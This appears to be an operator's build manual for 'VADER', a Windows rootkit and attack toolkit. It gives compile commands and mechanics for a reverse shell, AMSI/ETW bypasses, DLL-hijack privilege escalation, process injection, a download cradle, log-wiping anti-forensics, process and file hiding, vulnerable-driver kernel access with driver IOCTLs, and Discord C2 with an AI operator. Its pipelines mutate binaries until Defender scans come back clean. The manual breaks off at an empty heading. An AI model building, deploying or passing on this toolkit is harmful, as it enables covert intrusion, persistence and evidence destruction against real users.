# VADER ROOTKIT — BUILD FROM ASHES

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
REVISION:        1.0 — 2026-06-21
PURPOSE:         Full reconstruction manual. Rebuild everything from source on a fresh Windows machine.
HARDWARE:        Own systems only.
```

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [Directory Structure](#2-directory-structure)
3. [Build Order](#3-build-order)
4. [Phase-by-Phase Reconstruction](#4-phase-by-phase-reconstruction)
5. [Python Tooling](#5-python-tooling)
6. [Cloak Subsystem](#6-cloak-subsystem)
7. [BYOVD + Kernel](#7-byovd--kernel)
8. [C2 Infrastructure](#8-c2-infrastructure)
9. [Testing Checklist](#9-testing-checklist)
10. [Defender Scan Verification](#10-defender-scan-verification)
11. [CHEYANNE — Discord C2 Infrastructure](#11-cheyanne--discord-c2-infrastructure)
12. [HANDLER — AI-Powered C2 Operator](#12-handler--ai-powered-c2-operator)
13. [C2 Shortcuts + Live Watch](#13-c2-shortcuts--live-watch)
14. [Bidirectional Discord C2](#14-bidirectional-discord-c2)

---

## 1. Prerequisites

### Software — Install in This Order

| # | Tool | Version | Why | Install |
|---|------|---------|-----|---------|
| 1 | **Windows 11** | 24H2 Build 26200+ | Target OS, Defender active | Already installed |
| 2 | **Visual Studio 2025** | Community, v18 | MSVC compiler (cl.exe), linker, x64 toolchain | [visualstudio.microsoft.com](https://visualstudio.microsoft.com) |
| 3 | **Python** | 3.12+ | Orchestration scripts, no external packages | [python.org](https://python.org) |
| 4 | **Git** | Latest | Source control | [git-scm.com](https://git-scm.com) |
| 5 | **MASM (ml64.exe)** | Ships with VS | Assembling indirect syscall stubs | Included in VS "Desktop C++" workload |

### Visual Studio Workload

Install **"Desktop development with C++"**. This gives you:
- `cl.exe` (MSVC compiler)
- `link.exe` (linker)
- `ml64.exe` (MASM assembler)
- `vcvars64.bat` (environment setup)

### Critical Path — vcvars64.bat

Every compile command runs through this batch file first. `cheyanne_config.py` **auto-detects** your Visual Studio installation by globbing:

```
C:\Program Files\Microsoft Visual Studio\*\*\VC\Auxiliary\Build\vcvars64.bat
```

All build scripts (`deploy.py`, `mutate.py`, `cloak/build_cloak.py`, `byovd/build_byovd.py`, `vader_ui.py`) import from `cheyanne_config.py` with a hardcoded fallback. You should NOT need to edit any paths manually.

If auto-detection fails (no Visual Studio found), install "Desktop development with C++" workload from the Visual Studio Installer.

### Verify Toolchain

```cmd
:: Open "x64 Native Tools Command Prompt for VS 2025"
cl.exe
:: Should print: Microsoft (R) C/C++ Optimizing Compiler ...

ml64.exe
:: Should print: Microsoft (R) Macro Assembler ...

python --version
:: Should print: Python 3.x.x
```

### Windows Defender — Leave It On

The entire project is designed to compile and survive with Defender active. Real-Time Protection (RTP) must be ON during testing. MpCmdRun.exe auto-detected from:

```
C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe
```

### No External Python Packages

Everything uses stdlib only. No pip install required. The following stdlib modules are used: `os, sys, subprocess, json, socket, struct, threading, hashlib, secrets, re, glob, shutil, tempfile, argparse, uuid, base64, http.server, urllib.parse, datetime, collections, time, string, wave`.

---

## 2. Directory Structure

Create this tree under your chosen root (original: `C:\Users\gwu07\Desktop\cheyanne\`):

```
cheyanne/
├── deploy.py              # Deployment orchestrator
├── mutate.py              # XOR key rotation pipeline
├── metamorph.py           # Source-level metamorphic engine
├── vader_evolve.py        # Evolution pipeline (metamorph + mutate + compile + scan)
├── vader_menu.py          # Terminal dashboard (entry point)
├── vader_ui.py            # Web dashboard + agent listener (HTTP :8666, TCP :8667)
├── vader_agent.py         # Remote agent (target-side)
│
├── evasion/
│   └── xor.h              # Shared XOR encode/decode header
│
├── amsi/
│   ├── amsi_bypass_annotated.c        # Patch-based AMSI bypass (legacy)
│   └── amsi_bypass_hwbp_annotated.c   # HWBP AMSI bypass (DR0)
│
├── etw/
│   ├── etw_patch_annotated.c          # Patch-based ETW bypass (legacy)
│   └── etw_hwbp_annotated.c           # HWBP ETW bypass (DR1)
│
├── dark_room/
│   └── dark_room_annotated.c          # Combined AMSI+ETW bypass
│
├── vectors/
│   ├── v4_svc_replace/
│   │   └── svc_replace_annotated.c    # Service binary replacement
│   ├── v5_dll_proxy/
│   │   └── version_proxy_annotated.c  # DLL proxying (VERSION.dll)
│   ├── v6_path_hijack/
│   │   └── path_hijack_dll_annotated.c # PATH hijack DLL
│   └── v7_phantom_dll/
│       └── phantom_dll_annotated.c    # Office phantom DLL (osppc.dll)
│
├── injection/
│   ├── vader_inject_annotated.c       # Injector EXE (SetThreadContext)
│   ├── vader_inject_dll_annotated.c   # Injector DLL (HWBP propagation)
│   ├── gate.c                         # Indirect syscall gate (C side)
│   ├── gate.h                         # Gate header
│   ├── gate_stub.asm                  # MASM x64 syscall stubs
│   └── gate_stub.obj                  # Pre-assembled object (assemble if missing)
│
├── shell/
│   ├── vader_shell_annotated.c        # XOR-encrypted reverse shell
│   ├── vader_shell.c                  # Plain reverse shell (reference)
│   ├── vader_listener.py              # C2 listener (Python)
│   ├── vader_c2.py                    # C2 handler
│   └── test_listener.py              # Listener test script
│
├── stagers/
│   ├── http_stager_annotated.c        # HTTP download cradle
│   ├── vader_implant.c                # Persistent implant
│   ├── vader_serve.py                 # HTTP payload server
│   └── gen_implant_xor.py             # XOR payload generator
│
├── forensics/
│   └── vader_clean_annotated.c        # Anti-forensics (log clear, timestomp, self-delete)
│
├── cloak/
│   ├── build_cloak.py                 # Cloak build script
│   ├── gen_payload.py                 # Generates cloak_payload.h from cloak.dll
│   ├── test_cloak.py                  # Cloak test runner
│   ├── cloak.c                        # Main DLL entry + CBT hook
│   ├── cloak.h                        # Shared header
│   ├── cloak.def                      # DLL exports (CloakHookProc, SetCBTHook)
│   ├── hook_engine.c                  # IAT + inline hook engine
│   ├── hook_engine.h                  # Hook engine header
│   ├── hide_process.c                 # NtQuerySystemInformation hook
│   ├── hide_file.c                    # NtQueryDirectoryFile hook
│   ├── hide_connection.c              # GetTcpTable/GetUdpTable hook
│   ├── cloak_loader.c                 # Loader EXE (SetWindowsHookEx injection)
│   ├── cloak_payload.h                # Auto-generated: cloak.dll as byte array
│   ├── vader_dropper.c                # Single-click kill chain dropper
│   ├── c2_listen.py                   # Dropper callback listener (:53683)
│   ├── dump_targets.c                 # Debug utility
│   ├── test_hook.c                    # Hook engine test
│   ├── test_inline.c                  # Inline hook test
│   ├── test_debug.c                   # Debug test
│   ├── test_syscall.c                 # Syscall test
│   └── bin/                           # Build output directory
│       ├── cloak.dll                  # (built)
│       ├── cloak_loader.exe           # (built)
│       └── vader_dropper.exe          # (built)
│
├── byovd/
│   ├── build_byovd.py                # BYOVD build script
│   ├── byovd.h                       # IOCTL definitions (RTCore64, dbutil)
│   ├── byovd_loader.c                # Driver loader (sc create/start)
│   ├── kernel_ops.c                   # Kernel R/W primitives
│   ├── byovd_main.c                  # Main BYOVD operations
│   ├── vader_persist.c               # Kernel-level persistence
│   └── bin/                           # Build output
│       ├── byovd.exe                  # (built)
│       └── vader_persist.exe          # (built)
│
├── sideload/
│   ├── hunter.ps1                     # Sideload vector scanner v1
│   ├── hunter_v2.ps1                  # Sideload vector scanner v2
│   ├── svc_replace.c                  # Service replace PoC
│   ├── version_proxy_annotated.c      # VERSION.dll proxy
│   ├── canary_pure.c                  # Canary-only payload
│   └── (various iterations: v3, v4, v5, v6, m1, m2, m3)
│
├── privesc/
│   └── phantom_rpc.c                 # RPC-based privilege escalation
│
├── recon/
│   └── vader_recon.ps1               # Target reconnaissance script
│
├── reporting/
│   ├── pentest_report.py             # Auto-generate pentest reports
│   └── sessions/                     # Engagement session logs
│
├── tests/
│   ├── scan_all.py                   # Full binary Defender scan
│   ├── capture_evidence_36.ps1       # MSRC evidence capture
│   ├── test_system_temp_inheritance.ps1
│   └── test_vader_prime_auto.ps1
│
├── disclosure/
│   ├── poc_osppc.c                   # MSRC PoC: Office phantom DLL
│   ├── poc_path_hijack.c             # MSRC PoC: PATH hijack
│   ├── poc_dll_search_proof.c        # DLL search order proof
│   ├── poc_storsvc_trigger.c         # StorSvc trigger PoCs
│   └── evidence/                     # MSRC submission artifacts
│
├── exploits/
│   └── vader-prime/
│       ├── vader_payload.c           # Exploit payload
│       ├── find_blockedapps.py       # BlockedApps finder
│       ├── NtApiDotNet.dll           # .NET interop library
│       └── cldflt_26200.sys          # cldflt.sys for testing
│
├── evidence/                         # Engagement evidence (auto-generated)
│
├── downloads/                        # Stager download staging area
│
└── docs/
    ├── VADER_MANUAL.md               # Operator manual
    ├── FIELD_MANUAL.md               # Field reference
    ├── SITREP.md                     # Status report
    └── BUILD_FROM_ASHES.md           # This document
```

---

## 3. Build Order

Dependencies flow downward. Build in this sequence.

```
TIER 0 — PREREQUISITES
  ├── Verify cl.exe, ml64.exe, Python
  └── Verify Defender MpCmdRun.exe detected

TIER 1 — ASSEMBLY (one-time)
  └── gate_stub.asm → gate_stub.obj
      ml64.exe /c injection\gate_stub.asm /Fo:injection\gate_stub.obj

TIER 2 — CORE COMPONENTS (no inter-dependencies)
  ├── dark_room_annotated.c   → dark_room.exe       (AMSI+ETW bypass)
  ├── vader_shell_annotated.c → vader_shell.exe      (reverse shell)
  ├── vader_inject_annotated.c → vader_inject.exe    (injector EXE)
  ├── vader_inject_dll_annotated.c + gate.c + gate_stub.obj → vader_inject.dll
  ├── svc_replace_annotated.c → WsNativePushService.exe  (V4)
  ├── version_proxy_annotated.c → VERSION.dll        (V5)
  ├── path_hijack_dll_annotated.c → targetname.dll   (V6)
  ├── phantom_dll_annotated.c → osppc.dll            (V7)
  ├── http_stager_annotated.c → vader_stager.exe     (stager)
  ├── vader_implant.c → vader_implant.exe            (implant)
  └── vader_clean_annotated.c → vader_clean.exe      (forensics)

TIER 3 — CLOAK (depends on Tier 2 for dropper payload)
  ├── cloak.dll (from 5 source files + cloak.def)
  ├── cloak_loader.exe
  ├── gen_payload.py → cloak_payload.h (embeds cloak.dll as byte array)
  └── vader_dropper.exe (depends on cloak_payload.h)

TIER 4 — BYOVD (independent, requires vulnerable driver .sys file)
  ├── byovd.exe
  └── vader_persist.exe

TIER 5 — META TOOLS (Python, no compile — just verify they run)
  ├── deploy.py
  ├── mutate.py
  ├── metamorph.py
  └── vader_evolve.py
```

### One-Command Full Build

```cmd
cd C:\Users\gwu07\Desktop\cheyanne
python deploy.py --compile
```

This compiles all Tier 2 components. Cloak and BYOVD have separate build scripts.

---

## 4. Phase-by-Phase Reconstruction

### Phase 0: C2 REVERSE SHELL (ALPHA)

**Directory:** `shell/`
**Binary:** `vader_shell.exe`
**Source:** `vader_shell_annotated.c`

**Compile:**
```cmd
"%VCVARS%" && cd /d shell && cl.exe vader_shell_annotated.c /Fe:vader_shell.exe /O1 /GS- /utf-8 /link ws2_32.lib
```

**What it does:** XOR-encrypted reverse shell. All strings (cmd.exe, IP, port) stored as XOR-encoded byte arrays. Decoded at runtime on the stack, used, then zeroed. Winsock TCP connection back to C2 listener, pipes stdin/stdout/stderr of cmd.exe through the socket.

**Key dependencies:** `ws2_32.lib` (Winsock), XOR key in `#define XOR_KEY`.

**Bake in C2 address:**
```cmd
python shell\vader_listener.py 4443 --gen
```
This outputs XOR-encoded IP/port byte arrays to paste into the shell source.

**Test:** Start listener, compile shell, run shell. Should get cmd prompt.
```cmd
:: Terminal 1:
python shell\vader_listener.py 4443

:: Terminal 2:
shell\vader_shell.exe
```

---

### Phase 1+2: DARK ROOM (CHARLIE)

**Directory:** `dark_room/`
**Binary:** `dark_room.exe`
**Source:** `dark_room_annotated.c`

**Compile:**
```cmd
"%VCVARS%" && cd /d dark_room && cl.exe dark_room_annotated.c /Fe:dark_room.exe /O1 /GS-
```

**What it does:** Combined AMSI + ETW bypass using hardware breakpoints. Sets DR0 on AmsiScanBuffer entry, DR1 on EtwEventWrite entry. VEH handler catches EXCEPTION_SINGLE_STEP, sets return value to indicate success/failure, pops return address to skip the function entirely. Zero bytes modified in memory.

**Core mechanism:**
1. Resolve AmsiScanBuffer via GetProcAddress
2. SetThreadContext: DR0 = AmsiScanBuffer address, DR7 enables local BP0
3. Same for EtwEventWrite on DR1
4. AddVectoredExceptionHandler catches EXCEPTION_SINGLE_STEP
5. If RIP == AMSI addr: RAX = 0x80070057 (E_INVALIDARG), skip function
6. If RIP == ETW addr: RAX = 0x00000000 (STATUS_SUCCESS), skip function

**Test:**
```cmd
dark_room\dark_room.exe --test
```
Expected output: `AMSI: BLIND` and `ETW: BLIND`.

**MSRC Reference:** Finding #36, VULN-195458. Microsoft verdict: "Won't Fix" — detection bypasses are not a security boundary.

---

### Phase 3: PRIVILEGE ESCALATION (V4/V5/V6/V7)

Four vectors, each targeting a different sideload/hijack opportunity. All in `vectors/` subdirectories.

#### V4 — DELTA (Service Binary Replace)

**Directory:** `vectors/v4_svc_replace/`
**Binary:** `WsNativePushService.exe`
**Source:** `svc_replace_annotated.c`
**XOR Key Define:** `V4_KEY` (current: `0x52`)
**Requires:** Writable SYSTEM service binary (CWE-732)

```cmd
"%VCVARS%" && cd /d vectors\v4_svc_replace && cl.exe svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**Canary:** `C:\Windows\Temp\svc_health.log` — written when payload executes as SYSTEM.

---

#### V5 — ECHO (DLL Proxy)

**Directory:** `vectors/v5_dll_proxy/`
**Binary:** `VERSION.dll`
**Source:** `version_proxy_annotated.c`
**XOR Key Define:** `V5_KEY` (current: `0x37`)

```cmd
"%VCVARS%" && cd /d vectors\v5_dll_proxy && cl.exe version_proxy_annotated.c /Fe:VERSION.dll /LD /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

---

#### V6 — FOXTROT (PATH Hijack)

**Directory:** `vectors/v6_path_hijack/`
**Binary:** `targetname.dll`
**Source:** `path_hijack_dll_annotated.c`
**XOR Key Define:** `V6_KEY` (current: `0x63`)
**Requires:** Writable directory in PATH

```cmd
"%VCVARS%" && cd /d vectors\v6_path_hijack && cl.exe path_hijack_dll_annotated.c /Fe:targetname.dll /LD /O1 /utf-8 /link advapi32.lib user32.lib
```

**Canary:** `C:\Windows\Temp\hwmon_diag.log`

---

#### V7 — GOLF (Phantom DLL — Primary Vector)

**Directory:** `vectors/v7_phantom_dll/`
**Binary:** `osppc.dll`
**Source:** `phantom_dll_annotated.c`
**XOR Key Define:** `V7_KEY` (current: `0x19`)
**Requires:** Office installed on target

```cmd
"%VCVARS%" && cd /d vectors\v7_phantom_dll && cl.exe phantom_dll_annotated.c /Fe:osppc.dll /LD /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**Canary:** `C:\Windows\Temp\osp_telemetry.log`

**Deploy mechanism:** Place osppc.dll in `%USERPROFILE%\.local\bin\`. Office ClickToRun searches PATH for osppc.dll. When Office update task runs (or any Office app launches), it loads the phantom DLL as SYSTEM.

**Trigger (manual):**
```cmd
schtasks /Run /TN "\Microsoft\Office\Office Automatic Updates 2.0"
```

---

### Phase 4: PROCESS INJECTION (HOTEL)

**Directory:** `injection/`
**Binaries:** `vader_inject.exe` + `vader_inject.dll`
**Sources:** `vader_inject_annotated.c`, `vader_inject_dll_annotated.c`

**Prerequisite — Assemble syscall stubs (one-time):**
```cmd
"%VCVARS%" && cd /d injection && ml64.exe /c gate_stub.asm /Fo:gate_stub.obj
```

This produces `gate_stub.obj` which is linked into the inject DLL. The stubs implement indirect syscall invocation — the `syscall` instruction executes inside ntdll.dll's own code section, so stack-walking EDR sees a legitimate call origin.

**Compile injector EXE:**
```cmd
"%VCVARS%" && cd /d injection && cl.exe vader_inject_annotated.c /Fe:vader_inject.exe /O1 /GS- /utf-8
```

**Compile injector DLL (with indirect syscalls):**
```cmd
"%VCVARS%" && cd /d injection && cl.exe vader_inject_dll_annotated.c gate.c gate_stub.obj /Fe:vader_inject.dll /LD /O1 /GS- /utf-8
```

**What it does:** Injects DLL into target process. The DLL propagates hardware breakpoints (DR0/DR1 with AMSI/ETW targets) into every thread in the target process, creating a "dark room" inside that process. Uses NtCreateThreadEx for initial injection, then SetThreadContext for HWBP propagation.

---

### Phase 5: HTTP STAGER (INDIA)

**Directory:** `stagers/`
**Binary:** `vader_stager.exe`
**Source:** `http_stager_annotated.c`

```cmd
"%VCVARS%" && cd /d stagers && cl.exe http_stager_annotated.c /Fe:vader_stager.exe /O1 /GS- /utf-8 /link winhttp.lib advapi32.lib
```

**What it does:** WinHTTP download cradle. Connects to C2 HTTP server, downloads payload, executes. All URLs/paths XOR-encoded.

**Implant variant:**
```cmd
"%VCVARS%" && cd /d stagers && cl.exe vader_implant.c /Fe:vader_implant.exe /O1 /GS- /utf-8 /link winhttp.lib advapi32.lib user32.lib
```

**Payload server (operator side):**
```cmd
python stagers\vader_serve.py
:: Serves files from downloads/ on :8080
```

---

### Phase 6: ANTI-FORENSICS (JULIET)

**Directory:** `forensics/`
**Binary:** `vader_clean.exe`
**Source:** `vader_clean_annotated.c`

```cmd
"%VCVARS%" && cd /d forensics && cl.exe vader_clean_annotated.c /Fe:vader_clean.exe /O1 /GS- /utf-8 /link advapi32.lib user32.lib
```

**What it does:** Canary file deletion, event log clearing, prefetch wiping, MFT timestomping, self-deletion.

**Usage:**
```cmd
forensics\vader_clean.exe --self
```

---

## 5. Python Tooling

All Python tools are stdlib-only. No virtualenv needed.

### deploy.py — Deployment Orchestrator

The main command center. Chains recon, compile, scan, dark room, deploy, canary monitoring, C2 listener, and evidence collection.

**Key commands:**
```cmd
python deploy.py --compile              # Compile all Tier 2 components
python deploy.py --status               # Scan all binaries vs Defender
python deploy.py --recon                # Run vader_recon.ps1
python deploy.py --deploy V7            # Deploy single vector
python deploy.py --chain V7             # Full: dark room + vector + shell
python deploy.py --listen               # Start C2 listener (:4443)
python deploy.py --canary V7            # Check canary for vector
python deploy.py --compile-shell IP PORT # Build shell with baked-in C2
python deploy.py --pentest              # FULL AUTOMATION
python deploy.py --pentest --profile radon  # Against RADON profile
python deploy.py --pentest --dry-run    # Preview without executing
python deploy.py --cleanup              # Remove deployed payloads
```

**Target profiles** are defined in the `PROFILES` dict inside deploy.py. Each profile specifies hostname, user, admin status, Defender state, installed software, preferred/excluded vectors. Add new profiles by copying the structure.

**Pentest automation chain (--pentest):**
1. Load target profile
2. Compile all components
3. Scan against Defender
4. Run recon (or use profile defaults)
5. Auto-select best vector based on recon
6. Run dark room
7. Deploy vector
8. Monitor canary (default 300s timeout)
9. Collect evidence to `evidence/<timestamp>/`
10. Start C2 listener if SYSTEM achieved

---

### mutate.py — XOR Key Rotation Pipeline

Rotates XOR encryption keys in source files, recompiles, scans against Defender. Loops up to 10 attempts per component until a CLEAN result is achieved.

```cmd
python mutate.py                        # Rotate all components
python mutate.py --target dark_room     # Rotate single component
python mutate.py --dry-run              # Show what would change
python mutate.py --status               # Show current keys + build status
```

**How it works:**
1. Parse source file for `#define XOR_KEY 0xNN` (or V4_KEY, V5_KEY, etc.)
2. Find all `static const unsigned char name[] = { ... }` arrays
3. Decode arrays with old key, re-encode with new random key (0x80-0xFF range)
4. Update the `#define` in source
5. Update any inline `buf[i] ^= 0xNN` patterns
6. Compile the modified source
7. Scan the binary. If DETECTED, repeat with a different key (up to 10 tries)
8. If all 10 fail, restore original source from backup

**Component registry** in `COMPONENTS` dict maps each component name to its source file, output dir, compile flags, link libs, binary name, and key define name.

---

### metamorph.py — Source-Level Metamorphic Engine

Source-to-source C transformer. Changes structural identity of every binary on each cycle. Run BEFORE mutate.py.

```cmd
python metamorph.py                        # Transform all components
python metamorph.py --target dark_room     # Single component
python metamorph.py --dry-run              # Preview
python metamorph.py --intensity low|med|high
python metamorph.py --seed 42              # Reproducible transforms
```

**8 transform passes:**
1. **Dead code injection** — unreachable blocks with realistic WinAPI calls
2. **Junk variable insertion** — unused locals with computed assignments
3. **Opaque predicates** — always-true math wrapping real conditions
4. **Constant splitting** — decompose immediates into arithmetic
5. **Identifier mutation** — randomize internal var/function names
6. **Function reordering** — shuffle non-dependent functions
7. **String encryption upgrade** — multi-byte rolling key
8. **Junk API calls** — harmless WinAPI between real operations

**Intensity levels:**

| Level | Dead Blocks | Junk Vars | Opaque % | Const Split % | Junk API |
|-------|-------------|-----------|----------|---------------|----------|
| low   | 2           | 3         | 15%      | 20%           | 2        |
| med   | 5           | 6         | 30%      | 40%           | 4        |
| high  | 10          | 12        | 50%      | 60%           | 8        |

**Source registry** in `SOURCES` dict maps component names to annotated .c file paths (12 components including cloak and dropper).

---

### vader_evolve.py — Evolution Pipeline

Chains the full obfuscation pipeline in one command: metamorph → mutate → compile → scan → fingerprint.

```cmd
python vader_evolve.py                         # Full evolution
python vader_evolve.py --target dark_room      # Single component
python vader_evolve.py --intensity high        # Max transform density
python vader_evolve.py --cycles 3              # 3 evolution cycles
python vader_evolve.py --dry-run               # Preview
```

Each run produces a unique binary identity. No two cycles produce the same output.

---

### vader_menu.py — Terminal Dashboard

Interactive ANSI terminal UI. The primary entry point for daily operations.

```cmd
python vader_menu.py
```

Displays: VADER ASCII logo, Darth Vader helmet art, kill chain status (phase/codename/built status/XOR key), arsenal status, and operation menu.

**Operations:**
| Key | Action |
|-----|--------|
| 1 | Compile All |
| 2 | Scan All (Defender) |
| 3 | Dark Room Test |
| 4 | Mutate All (XOR rotation) |
| 5 | Full Pentest |
| 6 | Key Status |
| 7 | Build Cloak |
| 8 | Test Cloak |
| 9 | Activate Cloak |
| W | Web Dashboard |
| A | Agent (local) |
| 0 | Exit |

Colors matched to rainfantry.github.io palette using ANSI true color escapes.

---

### vader_ui.py — Web Dashboard

Single-file web UI using only stdlib `http.server`. No Flask, no JS frameworks, no npm.

```cmd
python vader_ui.py          # Default :8666
python vader_ui.py 9000     # Custom port
```

**Features:**
- Kill chain status with build indicators
- Arsenal overview
- Console output streaming (2000-line buffer)
- Operation execution (compile, scan, mutate, dark room, pentest)
- Agent management (TCP :8667)

**Agent listener:** Runs on TCP :8667. Uses length-prefixed JSON protocol (4-byte big-endian header + JSON payload). Agents connect, register with ID/hostname/IP/user/admin status/Defender version, then accept tasks and stream results back.

**Protocol (agent ↔ dashboard):**
```
[4 bytes: payload length (big-endian uint32)] + [JSON payload]

Register:  {"type": "register", "agent_id": "...", "hostname": "...", ...}
Task:      {"type": "task", "task_id": "...", "command": "...", "args": {...}}
Result:    {"type": "result", "task_id": "...", "output": "...", "rc": 0}
Heartbeat: {"type": "heartbeat"}
```

---

### vader_agent.py — Remote Agent

Lightweight task executor that runs on the target machine, connects back to the dashboard.

```cmd
python vader_agent.py <operator_ip>              # Default port 8667
python vader_agent.py <operator_ip> 8667         # Explicit port
python vader_agent.py <operator_ip> --reconnect  # Auto-reconnect (10s delay)
```

**What it does:** Connects to dashboard's agent listener, registers with system info (hostname, IP, user, admin status, Defender version), then loops waiting for tasks. Executes commands via subprocess, streams results back. Supports heartbeat (30s interval).

---

## 6. Cloak Subsystem

Separate build pipeline. System-wide process/file/connection concealment via SetWindowsHookEx CBT hook injection.

### Architecture

```
cloak.dll               ← Hook DLL injected into all processes via CBT hook
├── hook_engine.c       ← IAT + inline hook primitives
├── hide_process.c      ← NtQuerySystemInformation hook (process hiding)
├── hide_file.c         ← NtQueryDirectoryFile hook (file hiding)
├── hide_connection.c   ← GetTcpTable/GetUdpTable hook (connection hiding)
└── cloak.c             ← DllMain + CBT hook proc

cloak_loader.exe        ← Injects cloak.dll system-wide via SetWindowsHookEx
vader_dropper.exe       ← Full kill chain in one executable (embeds cloak.dll)
```

### Build

```cmd
python cloak\build_cloak.py --scan
```

**Build sequence:**
1. Compile `cloak.dll` from 5 source files with `/LD` and `cloak.def`:
   - Sources: `hook_engine.c, hide_process.c, hide_file.c, hide_connection.c, cloak.c`
   - Link libs: `iphlpapi.lib ws2_32.lib kernel32.lib ntdll.lib user32.lib`
   - Exports: `CloakHookProc`, `SetCBTHook` (defined in cloak.def)

2. Compile `cloak_loader.exe`:
   - Source: `cloak_loader.c`
   - Link libs: `kernel32.lib user32.lib`

3. Generate `cloak_payload.h` (auto — runs `gen_payload.py`):
   - Reads `cloak.dll` binary, converts to C byte array
   - Outputs `cloak_payload.h` with the embedded DLL

4. Compile `vader_dropper.exe` (depends on cloak_payload.h):
   - Source: `vader_dropper.c`
   - Include path: `-I cloak/` (for cloak_payload.h)
   - Link libs: `ws2_32.lib kernel32.lib ntdll.lib user32.lib`
   - Subsystem: `/SUBSYSTEM:WINDOWS` (no console window)

### Manual Compile Commands

```cmd
:: cloak.dll
"%VCVARS%" && cd /d cloak && cl.exe /nologo /O2 /W3 /LD hook_engine.c hide_process.c hide_file.c hide_connection.c cloak.c /Fe:"bin\cloak.dll" /link /DEF:"cloak.def" iphlpapi.lib ws2_32.lib kernel32.lib ntdll.lib user32.lib

:: cloak_loader.exe
"%VCVARS%" && cd /d cloak && cl.exe /nologo /O2 /W3 cloak_loader.c /Fe:"bin\cloak_loader.exe" /link kernel32.lib user32.lib

:: gen_payload.py (no compile — generates header)
python cloak\gen_payload.py

:: vader_dropper.exe
"%VCVARS%" && cd /d cloak && cl.exe /nologo /O2 /W3 /I"." vader_dropper.c /Fe:"bin\vader_dropper.exe" /link /SUBSYSTEM:WINDOWS ws2_32.lib kernel32.lib ntdll.lib user32.lib
```

### Test

```cmd
:: Build test hook executable
"%VCVARS%" && cd /d cloak && cl.exe /nologo /O2 test_hook.c /Fe:"bin\test_hook.exe" /link kernel32.lib user32.lib

:: Run test
cloak\bin\test_hook.exe
```

### Activate

```cmd
cloak\bin\cloak_loader.exe
:: Press ENTER in the loader window to deactivate
```

---

## 7. BYOVD + Kernel

Bring Your Own Vulnerable Driver — arbitrary kernel read/write via signed drivers with known CVEs.

### Supported Drivers

| Driver | CVE | Source | Device Name |
|--------|-----|--------|-------------|
| RTCore64.sys | CVE-2019-16098 | MSI Afterburner | `\\.\RTCore64` |
| dbutil_2_3.sys | CVE-2021-21551 | Dell BIOS Utility | `\\.\DBUtil_2_3` |

### Driver Acquisition

**RTCore64.sys** — Extract from MSI Afterburner installer. The .sys file is legitimately signed by Micro-Star Int'l Co. MSI Afterburner must be installed on the build machine (it's in the installed apps list).

**dbutil_2_3.sys** — Extract from Dell BIOS Utility. Legitimately signed by Dell.

Place the .sys file in `byovd/bin/` or alongside byovd.exe.

### Build

```cmd
python byovd\build_byovd.py --scan
```

**Build sequence:**
1. Compile `byovd.exe` from 3 source files:
   - Sources: `byovd_loader.c, kernel_ops.c, byovd_main.c`
   - Link libs: `psapi.lib kernel32.lib advapi32.lib`

2. Compile `vader_persist.exe` from 3 source files:
   - Sources: `byovd_loader.c, kernel_ops.c, vader_persist.c`
   - Link libs: `psapi.lib kernel32.lib advapi32.lib shlwapi.lib`

### Manual Compile Commands

```cmd
:: byovd.exe
"%VCVARS%" && cd /d byovd && cl.exe /nologo /O2 /W3 byovd_loader.c kernel_ops.c byovd_main.c /Fe:"bin\byovd.exe" /link psapi.lib kernel32.lib advapi32.lib

:: vader_persist.exe
"%VCVARS%" && cd /d byovd && cl.exe /nologo /O2 /W3 byovd_loader.c kernel_ops.c vader_persist.c /Fe:"bin\vader_persist.exe" /link psapi.lib kernel32.lib advapi32.lib shlwapi.lib
```

### How It Works

1. `byovd_loader.c` — Creates a kernel service for the .sys driver (`sc create`, `sc start`), opens device handle
2. `kernel_ops.c` — Kernel R/W primitives via IOCTL:
   - RTCore64: IOCTL 0x80002048 (read), 0x8000204C (write) with 48-byte RTCORE_BUFFER struct
   - dbutil: IOCTL 0x9B0C1EC4 (read), 0x9B0C1EC8 (write) with DBUTIL_BUFFER struct
3. `byovd_main.c` — Main operations using kernel R/W
4. `vader_persist.c` — Kernel-level persistence mechanisms

### Requirements

- **Admin/SYSTEM required** to load kernel drivers
- Driver must be **signed** (WHQL or legitimate vendor signature)
- Windows may block known-vulnerable drivers via **HVCI blocklist** — check `DriverBlockRules` first

---

## 8. C2 Infrastructure

### Port Map

| Port | Protocol | Component | Script |
|------|----------|-----------|--------|
| 4443 | TCP raw | C2 listener (v2) | `shell/vader_c2_v2.py` |
| 4443 | TCP raw | Reverse shell (v1, legacy) | `shell/vader_listener.py`, `shell/vader_c2.py` |
| 8080 | HTTP | Payload stager | `stagers/vader_serve.py` |
| 8666 | HTTP | Web dashboard | `vader_ui.py` |
| 8667 | TCP JSON | Agent listener | `vader_ui.py` (built-in) |
| 8890 | HTTP | File server (deploy) | `vader_c2_v2.py` / `deploy.py` |
| 8891 | HTTP | Screenshot/Watch receiver | `vader_c2_v2.py` (POST-back) |
| 8892 | HTTP | Watch live viewer | `vader_c2_v2.py` (browser) |
| 53683 | TCP | Dropper callback | `cloak/c2_listen.py` |

### Environment Setup (.env)

Create `.env` in the project root. This is gitignored — never committed.

```
DISCORD_BOT_TOKEN=your_bot_token_here
DISCORD_C2_CHANNEL=your_channel_id_here
DISCORD_C2_WEBHOOK=https://discord.com/api/webhooks/...
```

**How to get these:**
1. Create a Discord server (or use an existing one)
2. Create a bot at https://discord.com/developers/applications → Bot → Copy token
3. Invite bot to your server with `bot` + `applications.commands` scope and `Send Messages` + `Read Message History` permissions
4. Create a `#c2` channel → right-click → Copy Channel ID (enable Developer Mode in Discord settings first)
5. Channel Settings → Integrations → Webhooks → New Webhook → Copy URL

**Optional (for HANDLER AI operator):**
```
OPENROUTER_API_KEY=sk-or-...      # For Kimi K2.5 backend
ANTHROPIC_API_KEY=sk-ant-...       # For Claude backend
```

OpenRouter key from https://openrouter.ai/keys. Anthropic key from https://console.anthropic.com.

See `agent/.env.example` for a full template.

### Firewall Setup

Run once on operator machine (requires admin):
```cmd
setup_firewall.bat
```
Opens all 6 ports permanently (survives reboots). Right-click → Run as administrator.

### Shell C2 (vader_shell + vader_listener)

